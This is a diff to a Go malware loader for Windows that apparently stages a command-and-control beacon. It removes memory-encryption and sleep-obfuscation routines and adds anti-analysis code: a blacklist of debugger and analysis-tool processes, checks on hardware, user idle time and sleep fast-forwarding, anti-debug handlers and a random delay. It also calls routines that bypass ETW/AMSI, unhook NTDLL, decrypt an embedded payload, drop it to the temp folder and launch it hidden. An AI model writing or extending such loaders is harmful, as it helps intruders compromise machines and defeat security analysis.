@@ -5,6 +5,9 @@ import (
 	"path/filepath"
 	"os/exec"
 	"fmt"
+	"strings"
+	"time"
+
 	"golang.org/x/sys/windows"
 	"syscall"
 	"unsafe"
@@ -123,126 +126,6 @@ var _xorKey1 = []byte{0x36, 0xbd, 0xe1, 0x0f, 0x03, 0x58, 0x00, 0x71, 0x14, 0x29
 var _xorKey2 = []byte{0x63, 0xbd, 0x13, 0x7c, 0x51, 0xe3, 0xb8, 0xc2, 0x53, 0x82, 0xaa, 0xcd, 0x29, 0x62, 0xda, 0xf8, 0x10, 0x20, 0xae, 0x3d, 0x7e, 0x41, 0x54, 0x68, 0x64, 0xd6, 0x5c, 0x4b, 0x29, 0xe7, 0xbe, 0xf0}
 
 // ================================================================
-// VEH Memory Protection
-// ================================================================
-
-// VEH handler state
-var (
-	_protectedAddr uintptr
-	_protectedSize uintptr
-	_protectKey    []byte
-	_isEncrypted   bool
-)
-
-// EXCEPTION_RECORD simplified
-type exceptionRecord struct {
-	ExceptionCode        uint32
-	ExceptionFlags       uint32
-	ExceptionRecord      uintptr
-	ExceptionAddress     uintptr
-	NumberParameters     uint32
-	ExceptionInformation [15]uintptr
-}
-
-// CONTEXT64 simplified (ExceptionRecord offset 0x98 on x64)
-type exceptionPointers struct {
-	ExceptionRecord *exceptionRecord
-	ContextRecord   uintptr
-}
-
-// VEH handler: decrypt on first access, then single-step re-encrypt
-func vehHandler(ep *exceptionPointers) uintptr {
-	const EXCEPTION_ACCESS_VIOLATION = 0xC0000005
-	const EXCEPTION_SINGLE_STEP = 0x80000004
-
-	if ep == nil || ep.ExceptionRecord == nil {
-		return 0 // EXCEPTION_CONTINUE_SEARCH
-	}
-
-	code := ep.ExceptionRecord.ExceptionCode
-	_ = ep.ExceptionRecord.ExceptionAddress
-
-	if code == EXCEPTION_ACCESS_VIOLATION {
-		// Check if the faulting address is in our protected region
-		faultAddr := ep.ExceptionRecord.ExceptionInformation[1]
-		if faultAddr >= _protectedAddr && faultAddr < _protectedAddr+_protectedSize && _isEncrypted {
-			// Decrypt memory
-			xorMem(_protectedAddr, _protectedSize, _protectKey)
-			// Set PAGE_EXECUTE_READ
-			setMemProtect(_protectedAddr, _protectedSize, 0x40)
-			_isEncrypted = false
-			return 0xFFFFFFFF // EXCEPTION_CONTINUE_EXECUTION
-		}
-	}
-
-	if code == EXCEPTION_SINGLE_STEP {
-		// After single-step, re-encrypt if we just decrypted
-		if !_isEncrypted && _protectedAddr != 0 {
-			setMemProtect(_protectedAddr, _protectedSize, 0x04) // PAGE_READWRITE first
-			xorMem(_protectedAddr, _protectedSize, _protectKey)
-			setMemProtect(_protectedAddr, _protectedSize, 0x01) // PAGE_NOACCESS
-			_isEncrypted = true
-		}
-		return 0xFFFFFFFF
-	}
-
-	return 0 // EXCEPTION_CONTINUE_SEARCH
-}
-
-func xorMem(addr uintptr, size uintptr, key []byte) {
-	for i := uintptr(0); i < size; i++ {
-		*(*byte)(unsafe.Pointer(addr + i)) ^= key[i%uintptr(len(key))]
-	}
-}
-
-func setMemProtect(addr uintptr, size uintptr, protect uint32) {
-	k := windows.NewLazySystemDLL("kernel32.dll")
-	vp := k.NewProc("VirtualProtect")
-	var old uint32
-	syscall.SyscallN(vp.Addr(), addr, size, uintptr(protect), uintptr(unsafe.Pointer(&old)))
-}
-
-func installVEH(addr uintptr, size uintptr, key []byte) {
-	_protectedAddr = addr
-	_protectedSize = size
-	_protectKey = key
-	_isEncrypted = false
-
-	// AddVectoredExceptionHandler(1, handler)
-	// 1 = first handler
-	k := windows.NewLazySystemDLL("kernel32.dll")
-	aveh := k.NewProc("AddVectoredExceptionHandler")
-	handler := syscall.NewCallback(vehHandler)
-	syscall.SyscallN(aveh.Addr(), 1, handler)
-}
-
-// ================================================================
-// Sleep Obfuscation: encrypt memory + PAGE_NOACCESS during idle
-// ================================================================
-
-func sleepObfuscate(addr uintptr, size uintptr, key []byte, durationMs uintptr) {
-	k := windows.NewLazySystemDLL("kernel32.dll")
-	vp := k.NewProc("VirtualProtect")
-	sleep := k.NewProc("Sleep")
-
-	// Encrypt memory
-	xorMem(addr, size, key)
-
-	// Set PAGE_NOACCESS
-	var old uint32
-	syscall.SyscallN(vp.Addr(), addr, size, 0x01, uintptr(unsafe.Pointer(&old)))
-
-	// Sleep (memory is encrypted + inaccessible)
-	syscall.SyscallN(sleep.Addr(), durationMs)
-
-	// Set PAGE_EXECUTE_READWRITE
-	syscall.SyscallN(vp.Addr(), addr, size, 0x40, uintptr(unsafe.Pointer(&old)))
-
-	// Decrypt memory
-	xorMem(addr, size, key)
-}
-
-// ================================================================
 // Environment Check (simple path-only)
 // ================================================================
 
@@ -258,6 +141,208 @@ func checkEnv() bool {
 		}
 	}
 	return false
+}
+
+// ================================================================
+// Deep Sandbox Detection (5 layers) — T3 落盘执行路径的反分析闸门
+// ================================================================
+
+// sandboxProcessBlacklist 分析工具进程名（小写、含扩展名）。
+var sandboxProcessBlacklist = []string{
+	"x64dbg.exe", "x32dbg.exe", "ollydbg.exe", "ida.exe", "ida64.exe",
+	"ghidra.exe", "processhacker.exe", "procmon.exe", "procmon64.exe",
+	"procexp.exe", "procexp64.exe", "wireshark.exe", "pestudio.exe",
+	"fiddler.exe", "regshot.exe", "apimonitor.exe", "petools.exe",
+}
+
+// checkSandboxProcesses 第一重：枚举进程命中分析工具黑名单。
+func checkSandboxProcesses() bool {
+	k := windows.NewLazySystemDLL("kernel32.dll")
+	snap, _, _ := k.NewProc("CreateToolhelp32Snapshot").Call(0x2 /*TH32CS_SNAPPROCESS*/, 0)
+	if snap == 0 || snap == 0xFFFFFFFFFFFFFFFF {
+		return false
+	}
+	defer k.NewProc("CloseHandle").Call(snap)
+	type procEntry struct {
+		Size            uint32
+		Usage           uint32
+		ProcessID       uint32
+		DefaultHeapID   uintptr
+		ModuleID        uint32
+		Threads         uint32
+		ParentProcessID uint32
+		PriClassBase    int32
+		Flags           uint32
+		ExeFile         [260]uint16
+	}
+	var e procEntry
+	e.Size = uint32(unsafe.Sizeof(e))
+	p32f := k.NewProc("Process32FirstW")
+	p32n := k.NewProc("Process32NextW")
+	for r, _, _ := p32f.Call(snap, uintptr(unsafe.Pointer(&e))); r != 0; r, _, _ = p32n.Call(snap, uintptr(unsafe.Pointer(&e))) {
+		name := strings.ToLower(syscall.UTF16ToString(e.ExeFile[:]))
+		for _, bad := range sandboxProcessBlacklist {
+			if name == bad {
+				return true
+			}
+		}
+		e.Size = uint32(unsafe.Sizeof(e)) // 枚举间重置（防御）
+	}
+	return false
+}
+
+// checkSandboxHardware 第二重：硬件资源过弱（核数/内存/磁盘）。
+func checkSandboxHardware() bool {
+	k := windows.NewLazySystemDLL("kernel32.dll")
+	var sysinfo struct {
+		OemId                     uint32
+		PageSize                  uint32
+		MinimumApplicationAddress uintptr
+		MaximumApplicationAddress uintptr
+		ActiveProcessorMask       uintptr
+		NumberOfProcessors        uint32
+		ProcessorType             uint32
+		AllocationGranularity     uint32
+		ProcessorLevel            uint16
+		ProcessorRevision         uint16
+	}
+	syscall.SyscallN(k.NewProc("GetSystemInfo").Addr(), uintptr(unsafe.Pointer(&sysinfo)))
+	cores := int(sysinfo.NumberOfProcessors)
+	var memstat struct {
+		Length               uint32
+		MemoryLoad           uint32
+		TotalPhys            uint64
+		AvailPhys            uint64
+		TotalPageFile        uint64
+		AvailPageFile        uint64
+		TotalVirtual         uint64
+		AvailVirtual         uint64
+		AvailExtendedVirtual uint64
+	}
+	memstat.Length = uint32(unsafe.Sizeof(memstat))
+	syscall.SyscallN(k.NewProc("GlobalMemoryStatusEx").Addr(), uintptr(unsafe.Pointer(&memstat)))
+	ramGB := memstat.TotalPhys >> 30
+	var freeBytes, totalBytes, totalFree uint64
+	k.NewProc("GetDiskFreeSpaceExW").Call(uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr("C:\\"))),
+		uintptr(unsafe.Pointer(&freeBytes)), uintptr(unsafe.Pointer(&totalBytes)), uintptr(unsafe.Pointer(&totalFree)))
+	diskGB := totalBytes >> 30
+	return cores < 2 || ramGB < 2 || diskGB < 60
+}
+
+// checkSandboxIdle 第三重：用户交互缺失（键盘/鼠标空闲过久）。
+func checkSandboxIdle() bool {
+	type lastInputInfo struct {
+		Size uint32
+		Time uint32
+	}
+	var li lastInputInfo
+	li.Size = uint32(unsafe.Sizeof(li))
+	user32 := windows.NewLazySystemDLL("user32.dll")
+	if r, _, _ := user32.NewProc("GetLastInputInfo").Call(uintptr(unsafe.Pointer(&li))); r == 0 {
+		return false // 查询失败不误杀
+	}
+	tick, _, _ := windows.NewLazySystemDLL("kernel32.dll").NewProc("GetTickCount").Call()
+	idleSec := (uint32(tick) - li.Time) / 1000
+	return idleSec > 600 // 空闲 >10 分钟：无人值守的沙箱/蜜罐特征
+}
+
+// checkSandboxTimeWarp 第四重：时间加速（沙箱快进 Sleep）。
+// 正常机器 2s sleep 后 wall-clock 与 tick 偏差 <300ms；快进沙箱把 Sleep
+// 直接跳过——wall-clock 不动而 tick 被推远，偏差巨大。
+func checkSandboxTimeWarp() bool {
+	k := windows.NewLazySystemDLL("kernel32.dll")
+	gtc := k.NewProc("GetTickCount")
+	r0, _, _ := gtc.Call()
+	t0 := uint32(r0)
+	start := time.Now()
+	syscall.SyscallN(k.NewProc("Sleep").Addr(), 2000)
+	elapsedWall := time.Since(start)
+	r1, _, _ := gtc.Call()
+	t1 := uint32(r1)
+	elapsedTick := time.Duration(t1-t0) * time.Millisecond
+	diff := elapsedWall - elapsedTick
+	if diff < 0 {
+		diff = -diff
+	}
+	return diff > 1500*time.Millisecond
+}
+
+// checkSandboxDeep 汇总五重检测（路径 + 进程 + 硬件 + 交互 + 时间加速）。
+func checkSandboxDeep() bool {
+	if checkEnv() {
+		return true
+	}
+	if checkSandboxProcesses() {
+		return true
+	}
+	if checkSandboxHardware() {
+		return true
+	}
+	if checkSandboxIdle() {
+		return true
+	}
+	if checkSandboxTimeWarp() {
+		return true
+	}
+	return false
+}
+
+// ================================================================
+// Anti-Debug（VEH + API 双通道）
+// ================================================================
+
+var _debugHit bool
+
+// antiDebugVEH VEH 捕获 INT3/单步（调试器 attach 的直接特征）。
+// 注册为 first handler：命中即静默退出；其余异常 CONTINUE_SEARCH 交给
+// Go runtime 与系统既有 handler，不影响正常执行。
+func antiDebugVEH() {
+	type exceptionPointers struct {
+		ExceptionRecord uintptr
+		ContextRecord   uintptr
+	}
+	handler := syscall.NewCallback(func(ep *exceptionPointers) uintptr {
+		const EXCEPTION_BREAKPOINT = 0x80000003
+		const EXCEPTION_SINGLE_STEP = 0x80000004
+		if ep != nil && ep.ExceptionRecord != 0 {
+			code := *(*uint32)(unsafe.Pointer(ep.ExceptionRecord))
+			if code == EXCEPTION_BREAKPOINT || code == EXCEPTION_SINGLE_STEP {
+				_debugHit = true
+				os.Exit(0)
+			}
+		}
+		return 0 // EXCEPTION_CONTINUE_SEARCH
+	})
+	k := windows.NewLazySystemDLL("kernel32.dll")
+	k.NewProc("AddVectoredExceptionHandler").Call(1, handler)
+}
+
+// antiDebug API 通道：进程级 + 远程调试器检测。
+func antiDebug() bool {
+	k := windows.NewLazySystemDLL("kernel32.dll")
+	if r, _, _ := k.NewProc("IsDebuggerPresent").Call(); r != 0 {
+		return true
+	}
+	var dbg int32
+	k.NewProc("CheckRemoteDebuggerPresent").Call(
+		uintptr(windows.CurrentProcess()), uintptr(unsafe.Pointer(&dbg)), 0)
+	if dbg != 0 {
+		return true
+	}
+	return _debugHit
+}
+
+// ================================================================
+// Behavior Delay（行为延迟）
+// ================================================================
+
+// behaviorDelay 随机 3-8s 延迟（与时间加速检测串联，压自动分析吞吐）。
+func behaviorDelay() {
+	var r uint32
+	windows.NewLazySystemDLL("advapi32.dll").NewProc("SystemFunction036").Call(
+		uintptr(unsafe.Pointer(&r)), 4) // RtlGenRandom
+	delay := 3000 + time.Duration(r%5000)*time.Millisecond
+	time.Sleep(delay)
 }
 
 // ================================================================
@@ -444,40 +529,44 @@ func main() {
 	// donut 内存加载的 beacon 自读 trailer 不可靠（os.Executable 指向本 loader）——
 	// 同进程 env 下发配置，beacon 侧 GOC2_CFG_JSON 兜底解析（与 T0 的 cmd.Env 同理）
 	_ = os.Setenv("GOC2_CFG_JSON", string(_trailerJSON))
-	dbg := func(step string) {
-		f, _ := os.OpenFile(os.Getenv("TEMP")+"\\t3_dbg.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
-		if f != nil {
-			f.WriteString(step + "\n")
-			f.Close()
-		}
-	}
-	dbg("s1-self-cfg=" + string(_trailerJSON))
 	// 1. Hide console
 	hideConsole()
 
-	// 2. Environment check (path-only)
-	if checkEnv() {
+	// 2. 反调试双通道先装（VEH 常驻覆盖后续所有阶段）+ API 检测
+	antiDebugVEH()
+	if antiDebug() {
 		return
 	}
 
-	// 3. ETW/AMSI bypass
+	// 3. 深度沙箱五重检测（路径/进程黑名单/硬件/用户交互/时间加速）
+	if checkSandboxDeep() {
+		return
+	}
+
+	// 4. 行为延迟：随机 3-8s（配合时间加速检测压自动分析吞吐）
+	behaviorDelay()
+	// 延迟后二次时间校验（沙箱可能在首检后快进）
+	if checkSandboxTimeWarp() {
+		return
+	}
+
+	// 5. ETW/AMSI bypass
 	fixSystem()
 
-	// 4. NTDLL unhook
+	// 6. NTDLL unhook
 	reloadNTDLL()
 
-	// 5. Decrypt payload（完整 beacon EXE——donut 加载 Go runtime 不可改为落盘执行）
+	// 7. Decrypt payload（完整 beacon EXE——donut 加载 Go runtime 不可改为落盘执行）
 	enc := deobfuscateIPv4(_ipv4Data)
 	exeBytes := doubleXOR(enc, _xorKey1, _xorKey2)
 	if _padTail > 0 && _padTail < len(exeBytes) {
 		exeBytes = exeBytes[:len(exeBytes)-_padTail]
 	}
 	if len(exeBytes) < 1000 {
-		dbg("s6-decrypt-bad-len=" + fmt.Sprint(len(exeBytes)))
 		return
 	}
 
-	// 6. 落盘 %TEMP%（shellcode 直执行在 Go beacon 下不可靠）。
+	// 8. 落盘 %TEMP%（shellcode 直执行在 Go beacon 下不可靠）。
 	// 同名残留 beacon 进程在运行时会锁文件（Windows 运行中 exe 不可覆盖）——
 	// 写失败换 PID 后缀名重试，杜绝"跑过一次后永远失败"。
 	tmp := os.Getenv("TEMP")
@@ -492,20 +581,22 @@ func main() {
 		}
 		dst = filepath.Join(tmp, fmt.Sprintf("%s-%d.exe", alt, os.Getpid()))
 		if err2 := os.WriteFile(dst, exeBytes, 0o755); err2 != nil {
-			dbg("s7-write-err=" + err2.Error())
 			return
 		}
 	}
-	dbg("s7-drop-ok=" + dst)
+	// 明文 EXE 已落盘：进程内存里的解密 buffer 即刻清零（反内存扫描窗口收敛）
+	for i := range exeBytes {
+		exeBytes[i] = 0
+	}
+	exeBytes = nil
 	defer os.Remove(dst)
 
-	// 7. os/exec 启动 beacon（cmd.Env 下发 GOC2_CFG_JSON 配置）
+	// 9. os/exec 启动 beacon（cmd.Env 下发 GOC2_CFG_JSON 配置）
 	env := append(os.Environ(), "GOC2_CFG_JSON="+string(_trailerJSON))
 	cmd := exec.Command(dst)
 	cmd.Env = env
 	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true, CreationFlags: 0x08000000}
 	if err := cmd.Start(); err != nil {
-		dbg("s8-exec-err=" + err.Error())
 		return
 	}
 	_ = cmd.Wait()
